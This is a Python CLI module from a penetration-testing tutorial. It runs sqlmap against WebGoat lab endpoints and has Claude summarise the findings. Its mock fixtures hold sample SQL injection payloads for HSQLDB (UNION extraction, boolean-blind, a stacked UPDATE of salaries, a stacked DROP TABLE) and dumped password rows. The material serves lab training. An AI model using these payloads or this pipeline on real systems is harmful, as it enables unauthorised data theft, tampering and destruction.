"""CLI for the T2 SQLi + AI analyst tool.

Two target modes:

- **Single target** — ``--url X [--data Y] [--param Z]`` runs sqlmap
  against one URL.
- **Multi target** — ``--targets-file path/to/targets.txt`` runs sqlmap
  against each URL in the file, then concatenates the outputs and sends
  the whole pile to Claude in one call. This is the headline demo for
  the tutorial: scale up sqlmap output volume until manual triage is a
  chore, and let the analyst surface the headline.

Three execution modes:

- **Normal**: run sqlmap, then send the output to Claude, print the report.
- **--dry-run**: run sqlmap but skip the Claude call. Useful for verifying
  the sqlmap step in isolation (and the cost is zero).
- **--mock**: skip sqlmap AND skip Claude. URLs come from the targets
  file (default ``targets.example.txt``); the per-target narrative comes
  from canned ``MockStory`` fixtures keyed by URL substring. Lets you
  smoke-test the pipeline without WebGoat running and without burning
  an API token, and stays in sync with the shipped target set.

Outputs:

- A human-readable summary to stdout.
- The full structured ``SqliReport`` as JSON at the path given by
  ``--output`` (default ``report.json``). The JSON is the canonical
  record — future tutorials (CVE triage agent, defensive triage) can
  consume it.
"""
from __future__ import annotations

import argparse
import sys
from dataclasses import dataclass
from pathlib import Path

from dotenv import load_dotenv

from .analyst import (
    AnalystError,
    SqliReport,
    TableSummary,
    TargetFinding,
    analyse_sqlmap_output,
    compress_sqlmap_log,
    render_report_for_terminal,
)
from .sqlmap_runner import (
    SqlmapMissingError,
    SqlmapResult,
    run_sqlmap,
)
from .targets import Target, TargetsFileError, parse_targets_file


DEFAULT_DBMS = "hsqldb"
DEFAULT_MODEL = "claude-haiku-4-5"
DEFAULT_OUTPUT = "report.json"
DEFAULT_RAW_LOG = "sqlmap.log"
DEFAULT_COMPRESSED_LOG = "sqlmap.compressed.log"
DEFAULT_MOCK_TARGETS_FILE = "targets.example.txt"
RAW_OUTPUT_PREVIEW_LINES = 30  # how many lines of concatenated sqlmap stdout to echo


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="python -m tutorial_02",
        description=(
            "Drive sqlmap against one or more SQLi lab targets, then ask "
            "Claude to summarise the result. Lab targets only — illegal "
            "against systems you don't own or have written authorisation "
            "to test."
        ),
    )

    # Single-target group
    p.add_argument(
        "--url", default=None,
        help=(
            "Single target URL, e.g. "
            "http://localhost:8080/WebGoat/SqlInjection/assignment5b. "
            "Mutually exclusive with --targets-file."
        ),
    )
    p.add_argument(
        "--data", default=None,
        help=(
            "POST body for the single-target URL in "
            "application/x-www-form-urlencoded form, e.g. "
            "'login_count=1&userid=1'. Only valid with --url; for "
            "multi-target use, put per-target data on each line of the "
            "targets file."
        ),
    )
    p.add_argument(
        "--param", default=None,
        help=(
            "Specific parameter to target via sqlmap's -p flag. Omit for "
            "black-box discovery — sqlmap will test every parameter in "
            "--data. Only valid with --url."
        ),
    )

    # Multi-target group
    p.add_argument(
        "--targets-file", default=None,
        help=(
            "Path to a plain-text file listing multiple target URLs (one "
            "per line; format 'URL' or 'URL | DATA'; '#' comments allowed). "
            "Mutually exclusive with --url/--data/--param. See "
            "targets.example.txt for the format."
        ),
    )

    # Shared flags (apply to all targets)
    p.add_argument(
        "--cookie", default=None,
        help=(
            "Session cookie applied to every target, e.g. "
            '--cookie "JSESSIONID=ABC...XYZ". Pass it directly per run — '
            "the cookie expires on every WebGoat restart, so storing it "
            "anywhere durable (like .env) is a footgun. Omit entirely for "
            "unauthenticated targets."
        ),
    )
    p.add_argument(
        "--dbms", default=DEFAULT_DBMS,
        help=f"Sqlmap --dbms hint (default: {DEFAULT_DBMS}, WebGoat's HSQLDB).",
    )
    p.add_argument(
        "--model", default=DEFAULT_MODEL,
        help=f"Claude model for the analyst step (default: {DEFAULT_MODEL}).",
    )
    p.add_argument(
        "--api-key", default=None,
        help="Anthropic API key. Defaults to ANTHROPIC_API_KEY env var.",
    )
    p.add_argument(
        "--output", default=DEFAULT_OUTPUT,
        help=f"Where to write the structured JSON report (default: {DEFAULT_OUTPUT}).",
    )
    p.add_argument(
        "--raw-log", default=DEFAULT_RAW_LOG,
        help=(
            "Where to write the raw concatenated sqlmap stdout across every "
            f"target (default: {DEFAULT_RAW_LOG}). This is the audit-trail "
            "artefact and the input you'd re-analyse offline if you wanted "
            "to try a different model or prompt without re-running sqlmap. "
            "Pass an empty string to skip saving."
        ),
    )
    p.add_argument(
        "--compressed-log", default=DEFAULT_COMPRESSED_LOG,
        help=(
            "Where to write the compressed sqlmap log — what the LLM "
            "actually receives, after stripping [DEBUG] / timestamps / "
            f"consecutive duplicates (default: {DEFAULT_COMPRESSED_LOG}). "
            "Useful for diff against --raw-log to inspect what the "
            "deterministic preprocessing step removed. Pass an empty "
            "string to skip saving."
        ),
    )
    p.add_argument(
        "--dry-run", action="store_true",
        help="Run sqlmap but skip the Claude call. Prints sqlmap stdout only.",
    )
    p.add_argument(
        "--mock", action="store_true",
        help=(
            "Skip BOTH sqlmap and Claude. Uses fixture data — for "
            "development and smoke tests."
        ),
    )
    p.add_argument(
        "--thorough", action="store_true",
        help=(
            "Bump sqlmap to engagement-grade settings: --level=3 --risk=2. "
            "Default sqlmap (level 1, risk 1) is conservative and rejects "
            "many genuine findings as false positives against WebGoat's "
            "uniform response envelope — at level 3 + risk 2, most lessons "
            "confirm. Trade-off: per-target runtime grows roughly 5-10x "
            "(target ~1-3 minutes each vs ~5-30 seconds at default). "
            "Recommended for the headline live run; skip for fast iteration."
        ),
    )
    return p


def main(argv: list[str] | None = None) -> int:
    load_dotenv(override=True)
    parser = build_parser()
    args = parser.parse_args(argv)

    # ── Argument validation ────────────────────────────────────────
    if args.url and args.targets_file:
        parser.error("--url and --targets-file are mutually exclusive.")
    if args.targets_file and (args.data or args.param):
        parser.error(
            "--data and --param apply to single-target use only. "
            "For multi-target, put per-target data on each line of the "
            "targets file."
        )
    if not args.url and not args.targets_file and not args.mock:
        parser.error("Either --url or --targets-file is required.")

    # ── Resolve target list ────────────────────────────────────────
    if args.targets_file:
        targets_path = Path(args.targets_file)
    elif args.url:
        targets_path = None
    else:
        # --mock with neither --url nor --targets-file: fall back to the
        # shipped example file so the demo run always has real URLs
        # (and matches what the user would see in dry-run / live mode).
        targets_path = Path(DEFAULT_MOCK_TARGETS_FILE)
        if not targets_path.exists():
            print(
                f"[error] --mock with no --targets-file looks for "
                f"'{DEFAULT_MOCK_TARGETS_FILE}' in the current directory, "
                f"but it doesn't exist here.\n"
                f"        Either cd into the tutorial-02/ directory (where "
                f"the file lives) or pass --targets-file path/to/yours.txt.",
                file=sys.stderr,
            )
            return 1

    if targets_path is not None:
        try:
            targets = parse_targets_file(targets_path)
        except TargetsFileError as exc:
            print(f"[error] {exc}", file=sys.stderr)
            return 1
    else:
        targets = [Target(url=args.url, data=args.data)]

    # ── Banner ─────────────────────────────────────────────────────
    print("=" * 64)
    print("T2 — SQL injection with AI assistance")
    print("=" * 64)
    print(f"  Targets          : {len(targets)}")
    for i, t in enumerate(targets, start=1):
        suffix = f"  (data: {t.data})" if t.data else ""
        print(f"    {i}. {t.url}{suffix}")
    if args.url and args.param:
        print(f"  Parameter        : {args.param}")
    elif args.url:
        print(f"  Parameter        : (auto — sqlmap tests every parameter)")
    mode = 'MOCK' if args.mock else ('DRY-RUN' if args.dry_run else 'LIVE')
    sqlmap_settings = "level=3 risk=2 (--thorough)" if args.thorough else "level=1 risk=1 (sqlmap defaults)"
    print(f"  Mode             : {mode}")
    if not args.mock:
        print(f"  sqlmap settings  : {sqlmap_settings}")
    print()

    # ── Mock mode: fixture-only, no external calls ─────────────────
    if args.mock:
        sqlmap_stdout = _mock_sqlmap_output(targets)
        report = _mock_report(targets)
        _print_raw_preview(sqlmap_stdout, n_targets=len(targets))
        _save_log_to_disk(
            sqlmap_stdout,
            path_str=args.raw_log,
            label="Raw sqlmap log",
        )
        # Save the compressed version too — even on mock where the fixtures
        # have less [DEBUG] noise than a real run, the artefact lands so
        # readers see the full three-file pipeline shape on their first run.
        _save_log_to_disk(
            compress_sqlmap_log(sqlmap_stdout),
            path_str=args.compressed_log,
            label="Compressed sqlmap log (what the LLM would see)",
        )
        _print_and_save_report(report, output_path=Path(args.output))
        return 0

    # ── Run sqlmap on every target ─────────────────────────────────
    extra_sqlmap_args = ["--level=3", "--risk=2"] if args.thorough else None
    try:
        sqlmap_stdout = _run_all_targets(
            targets=targets,
            cookie=args.cookie,
            dbms=args.dbms,
            parameter=args.param,
            extra_args=extra_sqlmap_args,
        )
    except SqlmapMissingError as exc:
        print(f"[error] {exc}", file=sys.stderr)
        return 1

    _print_raw_preview(sqlmap_stdout, n_targets=len(targets))
    _save_log_to_disk(
        sqlmap_stdout,
        path_str=args.raw_log,
        label="Raw sqlmap log",
    )

    if args.dry_run:
        print(
            "[dry-run] Skipping Claude analyst step. The raw sqlmap log is on "
            "disk — re-run without --dry-run for the structured report, or "
            "feed the saved log to the analyst offline."
        )
        return 0

    # ── Claude analyst ─────────────────────────────────────────────
    # Compress the log before sending. The full uncompressed log is already
    # on disk as the audit-trail artefact; the LLM only needs the analytical
    # signal. Stripping [DEBUG] / timestamps / consecutive duplicates typically
    # cuts 60-80% of chars on a --thorough scan, which is the difference
    # between fitting Anthropic's per-minute rate limit and not.
    compressed = compress_sqlmap_log(sqlmap_stdout)
    reduction_pct = 100 * (1 - len(compressed) / max(len(sqlmap_stdout), 1))
    print()
    print(
        f"[analyst] compressed sqlmap log for prompt: "
        f"{len(sqlmap_stdout):,} → {len(compressed):,} chars "
        f"({reduction_pct:.0f}% noise stripped; full log preserved on disk)."
    )
    _save_log_to_disk(
        compressed,
        path_str=args.compressed_log,
        label="Compressed sqlmap log (what the LLM actually saw)",
    )
    print(
        f"[analyst] sending {len(compressed):,}-char compressed log across "
        f"{len(targets)} target(s) to Claude for interpretation..."
    )
    try:
        report = analyse_sqlmap_output(
            sqlmap_stdout=compressed,
            target_urls=[t.url for t in targets],
            model=args.model,
            api_key=args.api_key,
        )
    except AnalystError as exc:
        print(f"[error] {exc}", file=sys.stderr)
        return 1

    _print_and_save_report(report, output_path=Path(args.output))
    return 0


# ─── Orchestration helpers ──────────────────────────────────────────────────

def _run_all_targets(
    *,
    targets: list[Target],
    cookie: str | None,
    dbms: str,
    parameter: str | None,
    extra_args: list[str] | None = None,
) -> str:
    """Run sqlmap once per target; concatenate the captured stdout with
    delimiting banners.

    Banner format:

        === TARGET k/N: <url> ===
        --data: <body>   # only when data was provided
        sqlmap exit code: 0

        ...sqlmap stdout...

    The analyst prompt tells Claude to expect exactly this delimiter and
    produce one TargetFinding per banner. Don't change the banner shape
    without updating the prompt.

    A non-zero exit on one target is logged but doesn't abort the run —
    the other targets still produce useful output and the analyst can
    still report on what it has.
    """
    chunks: list[str] = []
    n = len(targets)
    for i, t in enumerate(targets, start=1):
        print(f"[sqlmap] target {i}/{n}: {t.url}")
        result = run_sqlmap(
            url=t.url,
            parameter=parameter,  # only set on single-target runs (else None)
            data=t.data,
            cookie=cookie,
            dbms=dbms,
            extra_args=extra_args,
        )
        if not result.ok:
            print(
                f"[warn] target {i}/{n} sqlmap exited {result.returncode}; "
                f"continuing with remaining targets. stderr tail:\n"
                f"  {result.stderr[-400:]!r}",
                file=sys.stderr,
            )
        else:
            print(f"[sqlmap]   done ({len(result.stdout):,} chars captured)")
        chunks.append(_format_target_chunk(i, n, t, result))
    return "\n\n".join(chunks)


def _format_target_chunk(idx: int, total: int, t: Target, result: SqlmapResult) -> str:
    """Render one target's captured stdout with its delimiting banner."""
    header_lines = [f"=== TARGET {idx}/{total}: {t.url} ==="]
    if t.data:
        header_lines.append(f"--data: {t.data}")
    header_lines.append(f"sqlmap exit code: {result.returncode}")
    return "\n".join(header_lines) + "\n\n" + result.stdout


# ─── Output helpers ─────────────────────────────────────────────────────────

def _print_raw_preview(sqlmap_stdout: str, *, n_targets: int) -> None:
    """Echo the first N lines of sqlmap's concatenated stdout.

    The full output is what the analyst sees; the preview is just so the
    user knows it ran. Showing the total volume up-front is the point —
    "thousands of lines → tiny structured summary" is the whole pitch.
    """
    lines = sqlmap_stdout.splitlines()
    print()
    print(
        f"─── Raw sqlmap output ({n_targets} target(s), {len(lines):,} lines, "
        f"{len(sqlmap_stdout):,} chars) ──"
    )
    for line in lines[:RAW_OUTPUT_PREVIEW_LINES]:
        print(f"  {line}")
    if len(lines) > RAW_OUTPUT_PREVIEW_LINES:
        print(f"  ... ({len(lines) - RAW_OUTPUT_PREVIEW_LINES:,} more lines not shown)")
    print("─" * 60)


def _save_log_to_disk(content: str, *, path_str: str | None, label: str) -> None:
    """Persist a log artefact to disk with a labelled stdout confirmation.

    Used for both the raw audit-trail log and the compressed prompt log.
    Pass an empty string (or None) for ``path_str`` to opt out — useful
    for CI environments where the on-disk artefact isn't wanted.
    """
    if not path_str:
        return
    path = Path(path_str)
    path.write_text(content, encoding="utf-8")
    print(f"[ok] {label} saved to {path} ({len(content):,} chars)")


def _print_and_save_report(report: SqliReport, *, output_path: Path) -> None:
    print()
    print("─── AI analyst report " + "─" * 39)
    print(render_report_for_terminal(report))
    print("─" * 60)
    output_path.write_text(
        report.model_dump_json(indent=2),
        encoding="utf-8",
    )
    print(f"\n[ok] Structured report saved to {output_path}")


# ─── Fixtures for --mock ────────────────────────────────────────────────────
#
# Design: the *URLs* live in targets.example.txt (single source of truth, also
# what dry-run + live use). The per-target *narrative* — the canned sqlmap
# stdout snippet and the analyst finding — lives here in code, keyed by a URL
# substring. Targets in the file that don't match any key get a generic
# placeholder finding (so mock degrades gracefully on user-added URLs).
#
# Each MockStory captures everything we'd say about one WebGoat lesson in
# both halves of the pipeline: what sqlmap would print, and what the analyst
# would conclude. The render functions below combine these stories with the
# URL list from the file to produce the same shapes the real pipeline would.


@dataclass(frozen=True)
class MockStory:
    """Canned mock narrative for one WebGoat lesson.

    Holds both halves of the story — the sqlmap stdout snippet and the
    analyst's per-target finding — so the mock pipeline can produce both
    artefacts (raw log + structured report) from one source.
    """

    stdout: str  # sqlmap output body, excluding the === TARGET k/N: ... === banner
    confirmed: bool
    vulnerable_parameter: str | None = None
    injection_type: str | None = None
    database_engine: str | None = None
    tables: tuple[TableSummary, ...] = ()
    notes: str | None = None

    def to_finding(self, url: str) -> TargetFinding:
        return TargetFinding(
            target_url=url,
            vulnerability_confirmed=self.confirmed,
            vulnerable_parameter=self.vulnerable_parameter,
            injection_type=self.injection_type,
            database_engine=self.database_engine,
            tables=list(self.tables),
            notes=self.notes,
        )


_MOCK_STORIES: dict[str, MockStory] = {
    # ── Lesson 9 — string SQLi, sqlmap can't confirm at default settings ──
    "assignment5a": MockStory(
        stdout="""\
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if POST parameter 'account' is dynamic
[WARNING] POST parameter 'account' does not appear to be dynamic
[INFO] testing if POST parameter 'operator' is dynamic
[WARNING] POST parameter 'operator' does not appear to be dynamic
[INFO] testing if POST parameter 'injection' is dynamic
[WARNING] POST parameter 'injection' does not appear to be dynamic
[INFO] testing for SQL injection on POST parameter 'account'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[WARNING] reflective value(s) found and filtering out
[WARNING] POST parameter 'account' does not seem to be injectable
[INFO] testing for SQL injection on POST parameter 'operator'
[WARNING] POST parameter 'operator' does not seem to be injectable
[INFO] testing for SQL injection on POST parameter 'injection'
[WARNING] POST parameter 'injection' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests.""",
        confirmed=False,
        notes="3 params tested; reflective-value filter foiled detection at default --level",
    ),

    # ── Lesson 10 — numeric SQLi, the headline find ──
    "assignment5b": MockStory(
        stdout="""\
        ___
       __H__
 ___ ___[(]_____ ___ ___  {<x.y.z>}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|

[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if POST parameter 'login_count' is dynamic
[INFO] POST parameter 'login_count' does NOT appear to be dynamic
[INFO] testing if POST parameter 'userid' is dynamic
[INFO] POST parameter 'userid' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'userid' might be injectable
[INFO] testing for SQL injection on POST parameter 'userid'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] target URL appears to have 7 columns in query
[INFO] POST parameter 'userid' is 'Generic UNION query (NULL) - 7 columns' injectable
[INFO] testing 'HSQLDB > 2.0 OR time-based blind - heavy query'
[INFO] POST parameter 'userid' appears to be 'HSQLDB > 2.0 OR time-based blind - heavy query' injectable
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: userid (POST)
    Type: time-based blind
    Title: HSQLDB > 2.0 OR time-based blind - heavy query
    Payload: login_count=1&userid=1 OR 7237=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS A, ...)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: login_count=1&userid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71706b6a71,...),NULL,NULL,NULL,NULL FROM (VALUES (0))-- -
---
[INFO] the back-end DBMS is HSQLDB
back-end DBMS: HSQLDB
[INFO] fetching tables for database: 'PUBLIC'
[INFO] fetching entries for table 'user_data' in database 'PUBLIC'

Database: PUBLIC
Table: user_data
[14 entries]
+--------+---------+-----------+----------+-------------+
| userid | first_n | last_name | login_ct | password    |
+--------+---------+-----------+----------+-------------+
| 101    | Joe     | Snow      | 0        | passwd1     |
| 102    | Joe     | Snow      | 0        | passwd2     |
| ... (12 more rows)                                    |
+--------+---------+-----------+----------+-------------+

[INFO] table 'PUBLIC.user_data' dumped to CSV file""",
        confirmed=True,
        vulnerable_parameter="userid",
        injection_type="UNION query (NULL) - 7 columns, plus HSQLDB time-based blind",
        database_engine="HSQLDB",
        tables=(
            TableSummary(
                name="user_data",
                columns=["userid", "first_name", "last_name", "login_count", "password"],
                row_count=14,
                sample_data=(
                    "101 / Joe / Snow / 0 / passwd1\n"
                    "102 / Joe / Snow / 0 / passwd2"
                ),
            ),
        ),
        notes="userid injectable; login_count clean; user_data dumped",
    ),

    # ── Lesson 11 — string SQLi, compromising confidentiality ──
    "attack8": MockStory(
        stdout="""\
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if POST parameter 'name' is dynamic
[INFO] POST parameter 'name' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'name' might be injectable
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] POST parameter 'name' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] target URL appears to have 6 columns in query
[INFO] POST parameter 'name' is 'Generic UNION query (NULL) - 6 columns' injectable
[INFO] testing for SQL injection on POST parameter 'auth_tan'
[WARNING] POST parameter 'auth_tan' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=a' AND 4719=4719-- -&auth_tan=1

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: name=a' UNION ALL SELECT NULL,NULL,CONCAT(0x71706b6a71,...),NULL,NULL,NULL FROM (VALUES (0))-- -&auth_tan=1
---
[INFO] the back-end DBMS is HSQLDB
back-end DBMS: HSQLDB
[INFO] fetching tables for database: 'PUBLIC'

Database: PUBLIC
Table: employees
[8 entries]
+--------+-----------+---------+
| userid | last_name | salary  |
+--------+-----------+---------+
| 32147  | Smith     | 80000   |
| 89762  | Jones     | 55000   |
| ... (6 more rows)            |
+--------+-----------+---------+""",
        confirmed=True,
        vulnerable_parameter="name",
        injection_type="boolean-based blind and UNION query (NULL) - 6 columns",
        database_engine="HSQLDB",
        tables=(
            TableSummary(
                name="employees",
                columns=["userid", "last_name", "salary"],
                row_count=8,
                sample_data="32147 / Smith / 80000\n89762 / Jones / 55000",
            ),
        ),
        notes="name injectable; auth_tan clean; employees table read (confidentiality)",
    ),

    # ── Lesson 12 — query chaining, compromising integrity (UPDATE) ──
    "attack9": MockStory(
        stdout="""\
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if POST parameter 'name' is dynamic
[INFO] POST parameter 'name' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'name' might be injectable
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] POST parameter 'name' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] testing 'HSQLDB stacked queries (heavy query - comment)'
[INFO] POST parameter 'name' appears to be 'HSQLDB stacked queries (heavy query - comment)' injectable
[INFO] testing for SQL injection on POST parameter 'auth_tan'
[WARNING] POST parameter 'auth_tan' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=a' AND 8821=8821-- -&auth_tan=1

    Type: stacked queries
    Title: HSQLDB stacked queries (heavy query - comment)
    Payload: name=a';UPDATE employees SET salary=999999 WHERE last_name='Smith'-- -&auth_tan=1
---
[INFO] the back-end DBMS is HSQLDB
back-end DBMS: HSQLDB""",
        confirmed=True,
        vulnerable_parameter="name",
        injection_type="stacked queries and boolean-based blind",
        database_engine="HSQLDB",
        notes="stacked queries land; UPDATE-write capability (integrity)",
    ),

    # ── Lesson 13 — DROP TABLE, compromising availability ──
    "attack10": MockStory(
        stdout="""\
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if POST parameter 'action_string' is dynamic
[INFO] POST parameter 'action_string' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'action_string' might be injectable
[INFO] testing for SQL injection on POST parameter 'action_string'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] POST parameter 'action_string' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] testing 'HSQLDB stacked queries (heavy query - comment)'
[INFO] POST parameter 'action_string' appears to be 'HSQLDB stacked queries (heavy query - comment)' injectable
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
---
Parameter: action_string (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action_string=a' AND 7654=7654-- -

    Type: stacked queries
    Title: HSQLDB stacked queries (heavy query - comment)
    Payload: action_string=a';DROP TABLE access_log-- -
---
[INFO] the back-end DBMS is HSQLDB
back-end DBMS: HSQLDB""",
        confirmed=True,
        vulnerable_parameter="action_string",
        injection_type="stacked queries and boolean-based blind",
        database_engine="HSQLDB",
        notes="stacked queries land; DROP TABLE capability (availability)",
    ),

    # ── Negative control — no params, sqlmap correctly reports nothing to test ──
    "lessonmenu.mvc": MockStory(
        stdout="""\
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter is dynamic
[WARNING] there are no GET parameters found
[CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--forms --crawl=2'""",
        confirmed=False,
        notes="no parameters present; sqlmap reports nothing to test",
    ),
}


_GENERIC_MOCK_STORY = MockStory(
    stdout=(
        "[INFO] testing connection to the target URL\n"
        "[INFO] testing if the target URL content is stable\n"
        "[WARNING] no canned mock data for this URL — this is a "
        "placeholder. Re-run without --mock against a live target "
        "to get real findings.\n"
    ),
    confirmed=False,
    notes=(
        "Mock fixture has no canned data for this URL. The shipped "
        "fixtures cover only the WebGoat SQLi (intro) lessons + the "
        "negative-control endpoint. Re-run without --mock to test "
        "this target live."
    ),
)


def _find_mock_story(url: str) -> MockStory:
    """Match a URL to its canned story via substring lookup on the path tail.

    Keyed loosely on purpose — works whether the URL has a trailing
    slash, a query string, or a different scheme/port.
    """
    for key, story in _MOCK_STORIES.items():
        if key in url:
            return story
    return _GENERIC_MOCK_STORY


def _mock_sqlmap_output(targets: list[Target]) -> str:
    """Build the concatenated mock sqlmap stdout for the given targets.

    Mirrors :func:`_run_all_targets`'s banner format exactly — the analyst
    prompt relies on ``=== TARGET k/N: <url> ===`` delimiters, so the
    mock has to produce the same shape.
    """
    chunks: list[str] = []
    n = len(targets)
    for i, t in enumerate(targets, start=1):
        story = _find_mock_story(t.url)
        header = [f"=== TARGET {i}/{n}: {t.url} ==="]
        if t.data:
            header.append(f"--data: {t.data}")
        header.append("sqlmap exit code: 0")
        chunks.append("\n".join(header) + "\n\n" + story.stdout)
    return "\n\n".join(chunks)


def _mock_report(targets: list[Target]) -> SqliReport:
    """Build the structured mock report by combining per-target stories.

    Findings come from the per-URL ``MockStory`` lookup; the overall
    summary + business-impact line are derived from the count of
    confirmed targets so they stay accurate when the targets file is
    customised.

    Important — the mock represents the **aspirational** outcome at
    engagement-grade sqlmap settings (--level=5 --risk=3 ish). A real
    live run at --thorough typically confirms only 2-3 of 6 because
    WebGoat's response-uniformity guard defeats sqlmap's false-positive
    validator on several lessons. The blog's "Calibrating expectations"
    section covers this. Don't update this mock to match the lower
    real-world count: the mock's whole job is to show the pipeline at
    its best so readers know what's possible.
    """
    findings = [_find_mock_story(t.url).to_finding(t.url) for t in targets]
    confirmed = sum(1 for f in findings if f.vulnerability_confirmed)
    total = len(findings)

    if confirmed == 0:
        summary = (
            f"{total} target(s) scanned; none confirmed at default settings. "
            "Consider --level=3 --risk=2 or check whether endpoints are real."
        )
        impact = (
            f"Informational — {total} scanned, 0 confirmed at default settings."
        )
    else:
        summary = (
            f"{confirmed}/{total} WebGoat SQLi-intro endpoints confirmed "
            "injectable; the rest tested clean. Findings span numeric and "
            "string injection contexts plus stacked-queries write capability."
        )
        impact = (
            f"Critical — {confirmed}/{total} endpoints permit unauthenticated "
            "SQLi against HSQLDB. CIA triad compromised: confidentiality "
            "(table reads), integrity (UPDATE), availability (DROP TABLE)."
        )

    return SqliReport(
        targets=findings,
        plain_english_summary=summary,
        business_impact=impact,
    )


__all__ = ["build_parser", "main"]
